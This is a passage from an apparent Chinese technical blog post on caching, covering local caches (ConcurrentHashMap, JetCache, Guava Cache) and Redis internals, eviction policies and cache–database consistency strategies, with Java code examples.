class="keyword">new</span> ConcurrentHashMap&lt;&gt;(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存删除</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteByKey</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        CACHE_MAP.remove(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 清空缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        CACHE_MAP.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存ConcurrentHashMap,根据id获取缓存</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id 案件编号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getValueByKey</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> CACHE_MAP.get(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存map中不存在该key(id)添加缓存记录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">putData</span><span class="params">(String id, String data)</span> </span>&#123;</span><br><span class="line">        CACHE_MAP.putIfAbsent(id, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-JetCache-CreateCache实现"><a href="#3-JetCache-CreateCache实现" class="headerlink" title="3.JetCache @CreateCache实现"></a>3.JetCache @CreateCache实现</h4><p>JetCache官网wiki文档：<a href="https://github.com/alibaba/jetcache/wiki" target="_blank" rel="noopener">https://github.com/alibaba/jetcache/wiki</a></p><p>创建缓存实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataCache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1800秒过期</span></span><br><span class="line">    <span class="meta">@CreateCache</span>(localExpire = <span class="number">1800</span>, cacheType = CacheType.LOCAL)</span><br><span class="line">    <span class="keyword">private</span> Cache&lt;String, Entity&gt; dataCache;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadDataAll</span><span class="params">(String id, Entity entity)</span> </span>&#123;</span><br><span class="line">        dataCache.put(id, entity);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">    dataCache.remove(id);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Entity <span class="title">getEntityById</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dataCache.get(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建方法缓存</p><p>使用@Cached方法可以为一个方法添加上缓存。JetCache通过Spring AOP生成代理，来支持缓存功能。注解可以加在接口方法上也可以加在类方法上，但需要保证是个Spring bean。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Cached</span>(name=<span class="string">"UserService.getUserById"</span>, expire = <span class="number">3600</span>)</span><br><span class="line">    <span class="function">User <span class="title">getUserById</span><span class="params">(<span class="keyword">long</span> userId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-Guava-Cache实现"><a href="#4-Guava-Cache实现" class="headerlink" title="4. Guava Cache实现"></a>4. Guava Cache实现</h4><p>Guava Cache是Google开源的Java重用工具集库Guava里的一款缓存工具，其主要实现的缓存功能有：</p><ul><li>自动将entry节点加载进缓存结构中；</li><li>当缓存的数据超过设置的最大值时，使用LRU算法移除；</li><li>具备根据entry节点上次被访问或者写入时间计算它的过期机制；</li><li>缓存的key被封装在WeakReference引用内；</li><li>缓存的Value被封装在WeakReference或SoftReference引用内；</li><li>统计缓存使用过程中命中率、异常率、未命中率等统计数据。</li></ul><p>Guava Cache的架构设计灵感来源于ConcurrentHashMap，我们前面也提到过，简单场景下可以自行编码通过hashmap来做少量数据的缓存，但是，如果结果可能随时间改变或者是希望存储的数据空间可控的话，自己实现这种数据结构还是有必要的。</p><p>Guava Cache继承了ConcurrentHashMap的思路，使用多个segments方式的细粒度锁，在保证线程安全的同时，支持高并发场景需求。Cache类似于Map，它是存储键值对的集合，不同的是它还需要处理evict、expire、dynamic load等算法逻辑，需要一些额外信息来实现这些操作。对此，根据面向对象思想，需要做方法与数据的关联封装。如图5所示cache的内存数据模型，可以看到，使用ReferenceEntry接口来封装一个键值对，而用ValueReference来封装Value值，之所以用Reference命令，是因为Cache要支持WeakReference Key和SoftReference、WeakReference value。</p><p><img src="../img/cache/cache0.png" alt=""></p><p>图1 Guava Cache数据结构图</p><p><strong>ReferenceEntry</strong>是对一个键值对节点的抽象，它包含了key和值的ValueReference抽象类，Cache由多个Segment组成，而每个Segment包含一个ReferenceEntry数组，每个ReferenceEntry数组项都是一条ReferenceEntry链，且一个ReferenceEntry包含key、hash、valueReference、next字段。除了在ReferenceEntry数组项中组成的链，在一个Segment中，所有ReferenceEntry还组成access链（accessQueue）和write链（writeQueue）（后面会介绍链的作用）。ReferenceEntry可以是强引用类型的key，也可以WeakReference类型的key，为了减少内存使用量，还可以根据是否配置了expireAfterWrite、expireAfterAccess、maximumSize来决定是否需要write链和access链确定要创建的具体Reference：StrongEntry、StrongWriteEntry、StrongAccessEntry、StrongWriteAccessEntry等。</p><p><strong>对于ValueReference</strong>，因为Cache支持强引用的Value、SoftReference Value以及WeakReference Value，因而它对应三个实现类：StrongValueReference、SoftValueReference、WeakValueReference。为了支持动态加载机制，它还有一个LoadingValueReference，在需要动态加载一个key的值时，先把该值封装在LoadingValueReference中，以表达该key对应的值已经在加载了，如果其他线程也要查询该key对应的值，就能得到该引用，并且等待改值加载完成，从而保证该值只被加载一次，在该值加载完成后，将LoadingValueReference替换成其他ValueReference类型。ValueReference对象中会保留对ReferenceEntry的引用，这是因为在Value因为WeakReference、SoftReference被回收时，需要使用其key将对应的项从Segment的table中移除。</p><p><strong>WriteQueue和AccessQueue</strong> ：为了实现最近最少使用算法，Guava Cache在Segment中添加了两条链：write链（writeQueue）和access链（accessQueue），这两条链都是一个双向链表，通过ReferenceEntry中的previousInWriteQueue、nextInWriteQueue和previousInAccessQueue、nextInAccessQueue链接而成，但是以Queue的形式表达。WriteQueue和AccessQueue都是自定义了offer、add（直接调用offer）、remove、poll等操作的逻辑，对offer（add）操作，如果是新加的节点，则直接加入到该链的结尾，如果是已存在的节点，则将该节点链接的链尾；对remove操作，直接从该链中移除该节点；对poll操作，将头节点的下一个节点移除，并返回。</p><p>了解了cache的整体数据结构后，再来看下针对缓存的相关操作就简单多了：</p><ul><li><strong>Segment中的evict清除策略操作</strong>，是在每一次调用操作的开始和结束时触发清理工作，这样比一般的缓存另起线程监控清理相比，可以减少开销，但如果长时间没有调用方法的话，会导致不能及时的清理释放内存空间的问题。evict主要处理四个Queue：1. keyReferenceQueue；2. valueReferenceQueue；3. writeQueue；4. accessQueue。前两个queue是因为WeakReference、SoftReference被垃圾回收时加入的，清理时只需要遍历整个queue，将对应的项从LocalCache中移除即可，这里keyReferenceQueue存放ReferenceEntry，而valueReferenceQueue存放的是ValueReference，要从Cache中移除需要有key，因而ValueReference需要有对ReferenceEntry的引用，这个前面也提到过了。而对后面两个Queue，只需要检查是否配置了相应的expire时间，然后从头开始查找已经expire的Entry，将它们移除即可。</li><li><strong>Segment中的put操作</strong>：put操作相对比较简单，首先它需要获得锁，然后尝试做一些清理工作，接下来的逻辑类似ConcurrentHashMap中的rehash，查找位置并注入数据。需要说明的是当找到一个已存在的Entry时，需要先判断当前的ValueRefernece中的值事实上已经被回收了，因为它们可以是WeakReference、SoftReference类型，如果已经被回收了，则将新值写入。并且在每次更新时注册当前操作引起的移除事件，指定相应的原因：COLLECTED、REPLACED等，这些注册的事件在退出的时候统一调用Cache注册的RemovalListener，由于事件处理可能会有很长时间，因而这里将事件处理的逻辑在退出锁以后才做。最后，在更新已存在的Entry结束后都尝试着将那些已经expire的Entry移除。另外put操作中还需要更新writeQueue和accessQueue的语义正确性。</li><li><strong>Segment带CacheLoader的get操作</strong>：1. 先查找table中是否已存在没有被回收、也没有expire的entry，如果找到，并在CacheBuilder中配置了refreshAfterWrite，并且当前时间间隔已经操作这个事件，则重新加载值，否则，直接返回原有的值；2. 如果查找到的ValueReference是LoadingValueReference，则等待该LoadingValueReference加载结束，并返回加载的值；3. 如果没有找到entry，或者找到的entry的值为null，则加锁后，继续在table中查找已存在key对应的entry，如果找到并且对应的entry.isLoading()为true，则表示有另一个线程正在加载，因而等待那个线程加载完成，如果找到一个非null值，返回该值，否则创建一个LoadingValueReference，并调用loadSync加载相应的值，在加载完成后，将新加载的值更新到table中，即大部分情况下替换原来的LoadingValueReference。</li></ul><p>Guava Cache提供Builder模式的CacheBuilder生成器来创建缓存的方式，十分方便，并且各个缓存参数的配置设置，类似于函数式编程的写法，可自行设置各类参数选型。它提供三种方式加载到缓存中。分别是：</p><ul><li>在构建缓存的时候，使用build方法内部调用CacheLoader方法加载数据；</li><li>callable 、callback方式加载数据；</li><li>使用粗暴直接的方式，直接Cache.put 加载数据，但自动加载是首选的，因为它可以更容易的推断所有缓存内容的一致性。</li></ul><p>build生成器的两种方式都实现了一种逻辑：从缓存中取key的值，如果该值已经缓存过了则返回缓存中的值，如果没有缓存过可以通过某个方法来获取这个值，不同的地方在于cacheloader的定义比较宽泛，是针对整个cache定义的，可以认为是统一的根据key值load value的方法，而callable的方式较为灵活，允许你在get的时候指定load方法。使用示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CacheLoader</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadingCache</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LoadingCache&lt;String, String&gt; graphs =CacheBuilder.newBuilder()</span><br><span class="line">     .maximumSize(<span class="number">1000</span>).build(<span class="keyword">new</span> CacheLoader&lt;String, String&gt;()</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="function"><span class="keyword">public</span> String <span class="title">load</span><span class="params">(String key)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             System.out.println(<span class="string">"key:"</span>+key);</span><br><span class="line">             <span class="keyword">if</span>(<span class="string">"key"</span>.equals(key))&#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">"key return result"</span>;</span><br><span class="line">             &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">"get-if-absent-compute"</span>;</span><br><span class="line">             &#125;                   </span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line">String resultVal = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    resultVal = graphs.get(<span class="string">"key"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> System.out.println(resultVal);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Callable</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callablex</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder()</span><br><span class="line">     .maximumSize(<span class="number">1000</span>).build();</span><br><span class="line">   String result = cache.get(<span class="string">"key"</span>, <span class="keyword">new</span> Callable&lt;String&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"result"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  System.out.println(result);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>总体来看，Guava Cache基于ConcurrentHashMap的优秀设计借鉴，在高并发场景支持和线程安全上都有相应的改进策略，使用Reference引用命令，提升高并发下的数据……访问速度并保持了GC的可回收，有效节省空间；同时，write链和access链的设计，能更灵活、高效的实现多种类型的缓存清理策略，包括基于容量的清理、基于时间的清理、基于引用的清理等；编程式的build生成器管理，让使用者有更多的自由度，能够根据不同场景设置合适的模式。</p><h3 id="缓存实现-分布式缓存"><a href="#缓存实现-分布式缓存" class="headerlink" title="缓存实现-分布式缓存"></a>缓存实现-分布式缓存</h3><h4 id="redis实现"><a href="#redis实现" class="headerlink" title="redis实现"></a>redis实现</h4><blockquote><p>Redis是一款内存高速缓存数据库。Redis全称为：<strong>Remote Dictionary Server</strong>（远程数据服务），使用C语言编写，Redis是一个key-value存储系统（键值存储系统），支持丰富的数据类型，如：String、list、set、zset、hash。</p></blockquote><p>Redis是一种支持key-value等多种数据结构的存储系统。可用于缓存，事件发布或订阅，高速队列等场景。支持网络，提供字符串，哈希，列表，队列，集合结构直接存取，基于内存，可持久化。同时性能强劲，具有复制特性以及解决问题而生的独一无二的数据模型。它可以存储键值对与5种不同类型的值之间的映射，可以将存储在内存的键值对数据持久化到硬盘，可以使用复制特性来扩展读性能，还可以使用客户端分片来扩展写性能。</p><p><img src="../img/cache/cache1.png" alt=""></p><p>图2 Redis数据模型图</p><p>如图2，Redis内部使用一个redisObject对象来标识所有的key和value数据，redisObject最主要的信息如图所示：type代表一个value对象具体是何种数据类型，encoding是不同数据类型在Redis内部的存储方式，比如——type=string代表value存储的是一个普通字符串，那么对应的encoding可以是raw或是int，如果是int则代表世界Redis内部是按数值类型存储和表示这个字符串。</p><p>图2左边的raw列为对象的编码方式：字符串可以被编码为raw（一般字符串）或Rint（为了节约内存，Redis会将字符串表示的64位有符号整数编码为整数来进行储存）；列表可以被编码为ziplist或linkedlist，ziplist是为节约大小较小的列表空间而作的特殊表示；集合可以被编码为intset或者hashtable，intset是只储存数字的小集合的特殊表示；hash表可以编码为zipmap或者hashtable，zipmap是小hash表的特殊表示；有序集合可以被编码为ziplist或者skiplist格式，ziplist用于表示小的有序集合，而skiplist则用于表示任何大小的有序集合。</p><p>从网络I/O模型上看，Redis使用单线程的I/O复用模型，自己封装了一个简单的AeEvent事件处理框架，主要实现了epoll、kqueue和select。对于单纯只有I/O操作来说，单线程可以将速度优势发挥到最大，但是Redis也提供了一些简单的计算功能，比如排序、聚合等，对于这些操作，单线程模型实际会严重影响整体吞吐量，CPU计算过程中，整个I/O调度都是被阻塞住的，在这些特殊场景的使用中，需要额外的考虑。相较于memcached的预分配内存管理，Redis使用现场申请内存的方式来存储数据，并且很少使用free-list等方式来优化内存分配，会在一定程度上存在内存碎片。Redis跟据存储命令参数，会把带过期时间的数据单独存放在一起，并把它们称为临时数据，非临时数据是永远不会被剔除的，即便物理内存不够，导致swap也不会剔除任何非临时数据（但会尝试剔除部分临时数据）。</p><p>我们描述Redis为内存数据库，作为缓存服务，大量使用内存间的数据快速读写，支持高并发大吞吐；而作为数据库，则是指Redis对缓存的持久化支持。Redis由于支持了非常丰富的内存数据库结构类型，如何把这些复杂的内存组织方式持久化到磁盘上? Redis的持久化与传统数据库的方式差异较大，Redis一共支持四种持久化方式，主要使用的两种：</p><ul><li><strong>定时快照方式(snapshot)</strong>：该持久化方式实际是在Redis内部一个定时器事件，每隔固定时间去检查当前数据发生的改变次数与时间是否满足配置的持久化触发的条件，如果满足则通过操作系统fork调用来创建出一个子进程，这个子进程默认会与父进程共享相同的地址空间，这时就可以通过子进程来遍历整个内存来进行存储操作，而主进程则仍然可以提供服务，当有写入时由操作系统按照内存页（page）为单位来进行copy-on-write保证父子进程之间不会互相影响。它的缺点是快照只是代表一段时间内的内存映像，所以系统重启会丢失上次快照与重启之间所有的数据。</li><li><strong>基于语句追加文件的方式(aof)</strong>：aof方式实际类似MySQl的基于语句的binlog方式，即每条会使Redis内存数据发生改变的命令都会追加到一个log文件中，也就是说这个log文件就是Redis的持久化数据。 aof的方式的主要缺点是追加log文件可能导致体积过大，当系统重启恢复数据时如果是aof的方式则加载数据会非常慢，几十G的数据可能需要几小时才能加载完，当然这个耗时并不是因为磁盘文件读取速度慢，而是由于读取的所有命令都要在内存中执行一遍。另外由于每条命令都要写log，所以使用aof的方式，Redis的读写性能也会有所下降。</li></ul><p>Redis的持久化使用了Buffer I/O，所谓Buffer I/O是指Redis对持久化文件的写入和读取操作都会使用物理内存的Page Cache，而大多数数据库系统会使用Direct I/O来绕过这层Page Cache并自行维护一个数据的Cache。而当Redis的持久化文件过大（尤其是快照文件），并对其进行读写时，磁盘文件中的数据都会被加载到物理内存中作为操作系统对该文件的一层Cache，而这层Cache的数据与Redis内存中管理的数据实际是重复存储的。虽然内核在物理内存紧张时会做Page Cache的剔除工作，但内核很可能认为某块Page Cache更重要，而让你的进程开始Swap，这时你的系统就会开始出现不稳定或者崩溃了，因此在持久化配置后，针对内存使用需要实时监控观察。</p><p>与memcached客户端支持分布式方案不同，Redis更倾向于在服务端构建分布式存储，如图10、11。</p><p><img src="/img/cache/cache2.png" alt=""></p><p><img src="../img/cache/cache3.png" alt=""></p><p>Redis Cluster是一个实现了分布式且允许单点故障的Redis高级版本，它没有中心节点，具有线性可伸缩的功能。如图11，其中节点与节点之间通过二进制协议进行通信，节点与客户端之间通过ascii协议进行通信。在数据的放置策略上，Redis Cluster将整个key的数值域分成2的14次方16384个hash槽，每个节点上可以存储一个或多个hash槽，也就是说当前Redis Cluster支持的最大节点数就是16384。Redis Cluster使用的分布式算法也很简单：<code>crc16( key ) % HASH_SLOTS_NUMBER</code>。整体设计可总结为：</p><ul><li>数据hash分布在不同的Redis节点实例上；</li><li>M/S的切换采用Sentinel；</li><li>写：只会写master Instance，从sentinel获取当前的master Instance；</li><li>读：从Redis Node中基于权重选取一个Redis Instance读取，失败/超时则轮询其他Instance；Redis本身就很好的支持读写分离，在单进程的I/O场景下，可以有效的避免主库的阻塞风险；</li></ul><h4 id="redis缓存淘汰策略"><a href="#redis缓存淘汰策略" class="headerlink" title="redis缓存淘汰策略"></a>redis缓存淘汰策略</h4><p>Redis共支持八种淘汰策略，分别是noeviction、volatile-random、volatile-ttl、volatile-lru、volatile-lfu、allkeys-lru、allkeys-random 和 allkeys-lfu 策略。</p><p><strong>分类：</strong></p><p>不淘汰</p><ul><li>noeviction （v4.0后默认的）</li></ul><p>对设置了过期时间的数据中进行淘汰</p><ul><li>随机：volatile-random</li><li>ttl：volatile-ttl</li><li>lru：volatile-lru</li><li>lfu：volatile-lfu</li></ul><p>全部数据进行淘汰</p><ul><li>随机：allkeys-random</li><li>lru：allkeys-lru</li><li>lfu：allkeys-lfu</li></ul><p><strong>淘汰策略详细说明:</strong></p><ol><li><strong>noeviction</strong></li></ol><p>该策略是Redis的默认策略。在这种策略下，一旦缓存被写满了，再有写请求来时，Redis 不再提供服务，而是直接返回错误。这种策略不会淘汰数据，所以无法解决缓存污染问题。一般生产环境不建议使用。</p><p>其他七种规则都会根据自己相应的规则来选择数据进行删除操作。</p><ol><li><strong>volatile-random</strong></li></ol><p>这个算法比较简单，在设置了过期时间的键值对中，进行随机删除。因为是随机删除，无法把不再访问的数据筛选出来，所以可能依然会存在缓存污染现象，无法解决缓存污染问题。</p><ol><li><strong>volatile-ttl</strong></li></ol><p>这种算法判断淘汰数据时参考的指标比随机删除时多进行一步过期时间的排序。Redis在筛选需删除的数据时，越早过期的数据越优先被选择。</p><ol><li><strong>volatile-lru</strong></li></ol><p>LRU算法：LRU 算法的全称是 Least Recently Used，按照最近最少使用的原则来筛选数据。这种模式下会使用 LRU 算法筛选设置了过期时间的键值对。</p><p>Redis优化的<strong>LRU算法实现</strong>：</p><p>Redis会记录每个数据的最近一次被访问的时间戳。在Redis在决定淘汰的数据时，第一次会随机选出 N 个数据，把它们作为一个候选集合。接下来，Redis 会比较这 N 个数据的 lru 字段，把 lru 字段值最小的数据从缓存中淘汰出去。通过随机读取待删除集合，可以让Redis不用维护一个巨大的链表，也不用操作链表，进而提升性能。</p><p>Redis 选出的数据个数 N，通过 配置参数 maxmemory-samples 进行配置。个数N越大，则候选集合越大，选择到的最久未被使用的就更准确，N越小，选择到最久未被使用的数据的概率也会随之减小。</p><ol><li><strong>volatile-lfu</strong></li></ol><p>会使用 LFU 算法选择设置了过期时间的键值对。</p><p><strong>LFU 算法</strong>：LFU 缓存策略是在 LRU 策略基础上，为每个数据增加了一个计数器，来统计这个数据的访问次数。当使用 LFU 策略筛选淘汰数据时，首先会根据数据的访问次数进行筛选，把访问次数最低的数据淘汰出缓存。如果两个数据的访问次数相同，LFU 策略再比较这两个数据的访问时效性，把距离上一次访问时间更久的数据淘汰出缓存。 Redis的LFU算法实现:</p><p>当 LFU 策略筛选数据时，Redis 会在候选集合中，根据数据 lru 字段的后 8bit 选择访问次数最少的数据进行淘汰。当访问次数相同时，再根据 lru 字段的前 16bit 值大小，选择访问时间最久远的数据进行淘汰。</p><p>Redis 只使用了 8bit 记录数据的访问次数，而 8bit 记录的最大值是 255，这样在访问快速的情况下，如果每次被访问就将访问次数加一，很快某条数据就达到最大值255，可能很多数据都是255，那么退化成LRU算法了。所以Redis为了解决这个问题，实现了一个更优的计数规则，并可以通过配置项，来控制计数器增加的速度。</p><p><strong>参数</strong> ：</p><p><code>lfu-log-factor</code> ，用计数器当前的值乘以配置项 lfu_log_factor 再加 1，再取其倒数，得到一个 p 值；然后，把这个 p 值和一个取值范围在（0，1）间的随机数 r 值比大小，只有 p 值大于 r 值时，计数器才加 1。</p><p><code>lfu-decay-time</code>， 控制访问次数衰减。LFU 策略会计算当前时间和数据最近一次访问时间的差值，并把这个差值换算成以分钟为单位。然后，LFU 策略再把这个差值除以 lfu_decay_time 值，所得的结果就是数据 counter 要衰减的值。</p><p><code>lfu-log-factor</code>设置越大，递增概率越低，lfu-decay-time设置越大，衰减速度会越慢。</p><p>我们在应用 LFU 策略时，一般可以将 lfu_log_factor 取值为 10。 如果业务应用中有短时高频访问的数据的话，建议把 lfu_decay_time 值设置为 1。可以快速衰减访问次数。</p><p>volatile-lfu 策略是 Redis 4.0 后新增。</p><ol><li><strong>allkeys-lru</strong></li></ol><p>使用 LRU 算法在所有数据中进行筛选。具体LFU算法跟上述 volatile-lru 中介绍的一致，只是筛选的数据范围是全部缓存，这里就不在重复。</p><ol><li><strong>allkeys-random</strong></li></ol><p>从所有键值对中随机选择并删除数据。volatile-random 跟 allkeys-random算法一样，随机删除就无法解决缓存污染问题。</p><ol><li><strong>allkeys-lfu</strong> </li></ol><p>使用 LFU 算法在所有数据中进行筛选。具体LFU算法跟上述 volatile-lfu 中介绍的一致，只是筛选的数据范围是全部缓存，这里就不在重复。</p><p>allkeys-lfu 策略是 Redis 4.0 后新增。</p><h2 id="数据库和缓存一致性问题"><a href="#数据库和缓存一致性问题" class="headerlink" title="数据库和缓存一致性问题"></a>数据库和缓存一致性问题</h2><h3 id="同步策略"><a href="#同步策略" class="headerlink" title="同步策略"></a>同步策略</h3><p>保证缓存和数据库的双写一致性，共有四种同步策略</p><ol><li>先更新缓存  再更新数据库</li><li>先更新数据库   再更新缓存</li><li>先删除缓存   再更新数据库</li><li>先更新数据库  再删除缓存</li></ol><h3 id="更新缓存与删除缓存的选择"><a href="#更新缓存与删除缓存的选择" class="headerlink" title="更新缓存与删除缓存的选择"></a>更新缓存与删除缓存的选择</h3><pre><code> 更新缓存的优点是每次数据变化时都能及时地更新缓存,这样不容易出现查询未命中的情况,但这种操作的消耗很大,如果数据需要经过复杂的计算再写入缓存的话,频繁的更新缓存会影响到服务器的性能。如果是写入数据比较频繁的场景,可能会导致频繁的更新缓存却没有业务来读取该数据。</code></pre><p>​    删除缓存的优点是操作简单,无论更新的操作复杂与否,都是直接删除缓存中的数据。这种做法的缺点则是,当删除了缓存之后,下一次查询容易出现未命中的情况,那么这时就需要再次读取数据库。</p><p>​    从缓存利用率的角度分析,不应该选择更新缓存方案。如果数据需要经过复杂的计算再写入缓存的话,频繁的更新缓存会影响到服务器的性能，且每次更新的缓存可能未被读取又进行了更新，缓存数据中还可能存放了很多不常用数据,浪费缓存资源。</p><h3 id="先操作数据库与后操作数据库的选择"><a href="#先操作数据库与后操作数据库的选择" class="headerlink" title="先操作数据库与后操作数据库的选择"></a>先操作数据库与后操作数据库的选择</h3><h4 id="第一步执行成功，第二步执行失败"><a href="#第一步执行成功，第二步执行失败" class="headerlink" title="第一步执行成功，第二步执行失败"></a>第一步执行成功，第二步执行失败</h4><p><strong>1) 先删除缓存，后更新数据库</strong></p><p>删除缓存成功后，数据库更新失败会导致新的读缓存请求读不到，重新读未更新的库，依然获取到的是删除缓存前的数据。</p><p><strong>2) 先更新数据库，后删除缓存</strong></p><p>先更新数据库再删除缓存，删除缓存失败会导致在缓存有效的期限内，所有读缓存的请求获取到的依旧是更新数据库前的数据。</p><h4 id="并发执行问题"><a href="#并发执行问题" class="headerlink" title="并发执行问题"></a>并发执行问题</h4><p><strong>1) 先删除缓存，后更新数据库</strong></p><p>如果有 2 个线程要并发「读写」数据，可能会发生以下场景：</p><ol><li>线程 A 要更新 X = 2（原值 X = 1）</li><li>线程 A 先删除缓存</li><li>线程 B 读缓存，发现不存在，从数据库中读取到旧值（X = 1）</li><li>线程 A 将新值写入数据库（X = 2）</li><li>线程 B 将旧值写入缓存（X = 1）</li></ol><p>最终 X 的值在缓存中是 1（旧值），在数据库中是 2（新值），发生不一致。</p><p>可见，先删除缓存，后更新数据库，当发生「读+写」并发时，还是存在数据不一致的情况。</p><p><strong>2) 先更新数据库，后删除缓存</strong></p><p>依旧是 2 个线程并发「读写」数据：</p><ol><li>缓存中 X 不存在（数据库 X = 1）</li><li>线程 A 读取数据库，得到旧值（X = 1）</li><li>线程 B 更新数据库（X = 2)</li><li>线程 B 删除缓存</li><li>线程 A 将旧值写入缓存（X = 1）</li></ol><p>最终 X 的值在缓存中是 1（旧值），在数据库中是 2（新值），也发生不一致。</p><p>这种情况「理论」来说是可能发生的，但实际真的有可能发生吗？</p><p>其实概率「很低」，这是因为它必须满足 3 个条件：</p><ol><li>缓存刚好已失效</li><li>读请求 + 写请求并发</li><li>更新数据库 + 删除缓存的时间（步骤 3-4），要比读数据库 + 写缓存时间短（步骤 2 和 5）</li></ol><p>仔细想一下，条件 3 发生的概率其实是非常低的。</p><p>因为写数据库一般会先「加锁」，所以写数据库，通常是要比读数据库的时间更长的。</p><p>这么来看，「先更新数据库 + 